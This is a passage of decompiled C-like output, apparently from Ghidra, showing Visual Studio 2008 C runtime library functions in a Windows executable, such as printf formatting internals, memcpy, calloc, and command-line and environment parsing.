              local_220 = piVar15;
              local_268 = piVar11;
              local_228 = (int **)((int)_ArgList + 8);
              local_27c = *(int **)_ArgList;
              local_278 = *(int **)((int)_ArgList + 4);
              plVar18 = &local_254;
              iVar7 = (int)(char)local_215;
              ppiVar14 = &local_27c;
              piVar11 = piVar3;
              piVar15 = local_268;
              piVar16 = local_21c;
              uVar17 = local_270;
              pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042adf8);
              (*pcVar5)(ppiVar14,piVar11,piVar15,iVar7,piVar16,uVar17,plVar18);
              uVar4 = local_214 & 0x80;
              if ((uVar4 != 0) && (local_21c == (int *)0x0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042ae04);
                (*pcVar5)(piVar11,plVar18);
              }
              if ((local_215 == 0x67) && (uVar4 == 0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042ae00);
                (*pcVar5)(piVar11,plVar18);
              }
              if (*(char *)piVar3 == '-') {
                local_214 = local_214 | 0x100;
                piVar3 = (int *)((int)piVar3 + 1);
                local_220 = piVar3;
              }
LAB_004186db:
              local_224 = (int *)_strlen((char *)piVar3);
            }
            else if (local_215 == 0x43) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
LAB_0041861b:
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x810) == 0) {
                local_210[0]._0_1_ = *_ArgList;
                local_224 = (int *)0x1;
              }
              else {
                eVar6 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,*(wchar_t *)_ArgList);
                if (eVar6 != 0) {
                  local_25c = 1;
                }
              }
              local_220 = local_210;
            }
            else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_00418526;
          }
          else {
            if (local_215 == 0x58) goto LAB_004188dc;
            if (local_215 == 0x5a) {
              piVar3 = *(int **)_ArgList;
              local_228 = (int **)((int)_ArgList + 4);
              if ((piVar3 == (int *)0x0) || (local_220 = (int *)piVar3[1], local_220 == (int *)0x0))
              {
                local_220 = (int *)PTR_DAT_0042adb0;
                piVar3 = (int *)PTR_DAT_0042adb0;
                goto LAB_004186db;
              }
              local_224 = (int *)(int)*(wchar_t *)piVar3;
              if ((local_214 & 0x800) == 0) {
                local_23c = 0;
              }
              else {
                local_224 = (int *)((int)local_224 / 2);
                local_23c = 1;
              }
            }
            else {
              if (local_215 == 0x61) goto LAB_00418539;
              if (local_215 == 99) goto LAB_0041861b;
            }
          }
LAB_00418ab5:
          if (local_25c == 0) {
            if ((local_214 & 0x40) != 0) {
              if ((local_214 & 0x100) == 0) {
                if ((local_214 & 1) == 0) {
                  if ((local_214 & 2) == 0) goto LAB_00418afe;
                  local_230 = 0x20;
                }
                else {
                  local_230 = 0x2b;
                }
              }
              else {
                local_230 = 0x2d;
              }
              local_234 = 1;
            }
LAB_00418afe:
            pcVar10 = (char *)((int)local_238 + (-local_234 - (int)local_224));
            if ((local_214 & 0xc) == 0) {
              _write_multi_char(0x20,(int)pcVar10,local_264);
            }
            pFVar2 = local_264;
            _write_string(local_234);
            if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
              _write_multi_char(0x30,(int)pcVar10,pFVar2);
            }
            if ((local_23c == 0) || ((int)local_224 < 1)) {
              _write_string((int)local_224);
            }
            else {
              local_268 = local_224;
              piVar3 = local_220;
              do {
                _WCh = *(wchar_t *)piVar3;
                local_268 = (int *)((int)local_268 + -1);
                piVar3 = (int *)((int)piVar3 + 2);
                eVar6 = _wctomb_s(&local_274,local_11 + 1,6,_WCh);
                if ((eVar6 != 0) || (local_274 == 0)) {
                  local_22c = -1;
                  break;
                }
                _write_string(local_274);
              } while (local_268 != (int *)0x0);
            }
            if ((-1 < local_22c) && ((local_214 & 4) != 0)) {
              _write_multi_char(0x20,(int)pcVar10,pFVar2);
            }
          }
        }
        else {
          if ('p' < (char)local_215) {
            if (local_215 == 0x73) {
LAB_004185a8:
              piVar3 = local_21c;
              if (local_21c == (int *)0xffffffff) {
                piVar3 = (int *)0x7fffffff;
              }
              local_228 = (int **)((int)_ArgList + 4);
              local_220 = *(int **)_ArgList;
              if ((local_214 & 0x810) == 0) {
                local_224 = local_220;
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_DAT_0042adb0;
                  local_224 = (int *)PTR_DAT_0042adb0;
                }
                for (; (piVar3 != (int *)0x0 &&
                       (piVar3 = (int *)((int)piVar3 + -1), *(char *)local_224 != '\0'));
                    local_224 = (int *)((int)local_224 + 1)) {
                }
                local_224 = (int *)((int)local_224 - (int)local_220);
              }
              else {
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_u__null__0042adb4;
                }
                local_23c = 1;
                for (piVar11 = local_220;
                    (piVar3 != (int *)0x0 &&
                    (piVar3 = (int *)((int)piVar3 + -1), *(wchar_t *)piVar11 != L'\0'));
                    piVar11 = (int *)((int)piVar11 + 2)) {
                }
                local_224 = (int *)((int)piVar11 - (int)local_220 >> 1);
              }
              goto LAB_00418ab5;
            }
            if (local_215 == 0x75) goto LAB_00418780;
            if (local_215 != 0x78) goto LAB_00418ab5;
            local_260 = 0x27;
LAB_00418908:
            local_224 = (int *)0x10;
            if ((local_214 & 0x80) != 0) {
              local_22f = (char)local_260 + 'Q';
              local_230 = 0x30;
              local_234 = 2;
            }
            goto LAB_0041878a;
          }
          if (local_215 == 0x70) {
            local_21c = (int *)0x8;
LAB_004188dc:
            local_260 = 7;
            goto LAB_00418908;
          }
          if ((char)local_215 < 'e') goto LAB_00418ab5;
          if ((char)local_215 < 'h') goto LAB_00418539;
          if (local_215 == 0x69) goto LAB_00418779;
          if (local_215 != 0x6e) {
            if (local_215 != 0x6f) goto LAB_00418ab5;
            local_224 = (int *)0x8;
            if ((local_214 & 0x80) != 0) {
              local_214 = local_214 | 0x200;
            }
            goto LAB_0041878a;
          }
          piVar3 = *(int **)_ArgList;
          local_228 = (int **)((int)_ArgList + 4);
          iVar7 = __get_printf_count_output();
          if (iVar7 == 0) goto switchD_0041828d_caseD_9;
          if ((local_214 & 0x20) == 0) {
            *piVar3 = local_22c;
          }
          else {
            *(wchar_t *)piVar3 = (wchar_t)local_22c;
          }
          local_25c = 1;
        }
        if (local_258 != (int *)0x0) {
          _free(local_258);
          local_258 = (int *)0x0;
        }
        break;
      default:
        goto switchD_0041828d_caseD_9;
      case 0xbad1abe1:
        break;
      }
      local_215 = *local_240;
      _Format = (char *)local_240;
      _ArgList = (va_list)local_228;
    } while (local_215 != 0);
    if ((local_244 == 0) || (local_244 == 7)) goto LAB_00418c81;
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_00418c9a:
  iVar7 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  short *psVar2;
  LPWSTR pWVar3;
  int in_stack_0000001c;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,(localeinfo_struct *)_LocaleName);
  psVar2 = (short *)_CchSrc;
  pWVar3 = _LpDestStr;
  if (0 < (int)_LpDestStr) {
    do {
      pWVar3 = (LPWSTR)((int)pWVar3 + -1);
      if (*psVar2 == 0) goto LAB_00418cfa;
      psVar2 = psVar2 + 1;
    } while (pWVar3 != (LPWSTR)0x0);
    pWVar3 = (LPWSTR)0xffffffff;
LAB_00418cfa:
    _LpDestStr = (LPWSTR)((int)_LpDestStr + (-1 - (int)pWVar3));
  }
  iVar1 = LCMapStringW(_DWMapFlag,(DWORD)_LpSrcStr,(LPCWSTR)_CchSrc,(int)_LpDestStr,(LPWSTR)_CchDest
                       ,in_stack_0000001c);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2008 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  wchar_t *_DWMapFlag;
  wint_t wVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  wVar1 = 0xffff;
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    _DWMapFlag = (local_18.locinfo)->lc_category[0].wlocale;
    if (_DWMapFlag == (wchar_t *)0x0) {
      wVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        wVar1 = _C + 0x20;
      }
    }
    else if (_C < 0x100) {
      iVar2 = __iswctype_l(_C,1,&local_18);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = (wint_t)*(byte *)((int)local_18.locinfo[1].lc_category[0].wlocale + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW((LPCWSTR)&local_18,(DWORD)_DWMapFlag,(LPCWSTR)0x100,(int)&_C,
                                 (LPWSTR)0x1,(int)local_8);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return wVar1;
}



// Library Function - Single Match
//  _fastcopy_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastcopy_I(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined4 * __cdecl __VEC_memcpy(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      _fastcopy_I(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    __VEC_memcpy((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _has_osfxsr_set
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 _has_osfxsr_set(void)

{
  return 1;
}



// WARNING: Removing unreachable block (ram,0x00419008)
// WARNING: Removing unreachable block (ram,0x00418ff5)
// Library Function - Single Match
//  __get_sse2_info
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __get_sse2_info(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = _has_osfxsr_set(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2008 Release

int * __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  uint *_Size;
  uint *dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    _Size = (uint *)(param_1 * param_2);
    dwBytes = _Size;
    if (_Size == (uint *)0x0) {
      dwBytes = (uint *)0x1;
    }
    do {
      piVar1 = (int *)0x0;
      if (dwBytes < (uint *)0xffffffe1) {
        if ((DAT_0042e8b8 == 3) &&
           (dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0), _Size <= DAT_0042e8c4)) {
          __lock(4);
          piVar1 = ___sbh_alloc_block(_Size);
          FUN_00419136();
          if (piVar1 != (int *)0x0) {
            _memset(piVar1,0,(size_t)_Size);
            goto LAB_004190eb;
          }
        }
        else {
LAB_004190eb:
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
        piVar1 = (int *)HeapAlloc(DAT_0042be74,8,(SIZE_T)dwBytes);
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_0042c1c4 == 0) {
        if (param_3 == (undefined4 *)0x0) {
          return (int *)0x0;
        }
        *param_3 = 0xc;
        return (int *)0x0;
      }
      iVar2 = __callnewh((size_t)dwBytes);
    } while (iVar2 != 0);
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = 0xc;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return (int *)0x0;
}



void FUN_00419136(void)

{
  FUN_00413064(4);
  return;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



void FUN_004191a8(void)

{
  return;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2008 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  int iVar8;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + DAT_0042adcc * 3);
    if ((puVar1 + DAT_0042adcc * 3 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          if (DAT_0042adc0 < DAT_0042adc4 + DAT_0042adc0) {
            iVar7 = DAT_0042adc0 * 0xc;
            iVar8 = DAT_0042adc0;
            do {
              *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar8 = iVar8 + 1;
              iVar7 = iVar7 + 0xc;
            } while (iVar8 < DAT_0042adc4 + DAT_0042adc0);
          }
          uVar4 = *puVar6;
          iVar8 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar8;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2008 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_0042e8d4;
  if (DAT_0042e8d4 == (ushort *)0x0) {
    puVar3 = &DAT_00422b50;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetenvp(void)

{
  int iVar1;
  wchar_t **ppwVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  size_t _Count;
  
  iVar5 = 0;
  pwVar4 = DAT_0042b9d4;
  if (DAT_0042b9d4 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + iVar1 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      iVar1 = FUN_0041c621(pwVar4);
    }
    ppwVar2 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_0042b9d4;
    DAT_0042be90 = ppwVar2;
    if (ppwVar2 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + _Count) {
        iVar5 = FUN_0041c621(pwVar4);
        _Count = iVar5 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(_Count,2);
          *ppwVar2 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_0042be90);
            DAT_0042be90 = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,_Count,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar2 = ppwVar2 + 1;
        }
      }
      _free(DAT_0042b9d4);
      DAT_0042b9d4 = (wchar_t *)0x0;
      *ppwVar2 = (wchar_t *)0x0;
      _DAT_0042e8a4 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2008 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short *psVar3;
  short sVar4;
  uint uVar5;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar4 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar4 = *in_EAX;
      if (sVar4 == 0) goto LAB_0041949d;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar4 != 0x20 && (sVar4 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_0041949d:
  bVar1 = false;
  while (psVar3 = in_EAX, *in_EAX != 0) {
    for (; (*psVar3 == 0x20 || (*psVar3 == 9)); psVar3 = psVar3 + 1) {
    }
    if (*psVar3 == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar5 = 0;
      for (; *psVar3 == 0x5c; psVar3 = psVar3 + 1) {
        uVar5 = uVar5 + 1;
      }
      in_EAX = psVar3;
      if (*psVar3 == 0x22) {
        if (((uVar5 & 1) == 0) && ((!bVar1 || (in_EAX = psVar3 + 1, *in_EAX != 0x22)))) {
          bVar2 = false;
          bVar1 = !bVar1;
          in_EAX = psVar3;
        }
        uVar5 = uVar5 >> 1;
      }
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar4 = *in_EAX;
      if ((sVar4 == 0) || ((!bVar1 && ((sVar4 == 0x20 || (sVar4 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar4;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      psVar3 = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_0042c418 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_0042c210,0x104);
  _DAT_0042be9c = &DAT_0042c210;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_0042be7c = local_8 - 1;
    iVar3 = 0;
    _DAT_0042be84 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2008 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  WCHAR *pWVar3;
  size_t _Size;
  void *_Dst;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar3 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar2 = pWVar3;
        pWVar3 = pWVar2 + 1;
      } while (*pWVar3 != L'\0');
      pWVar3 = pWVar2 + 2;
      WVar1 = *pWVar3;
    }
    _Size = (int)pWVar3 + (2 - (int)_Src);
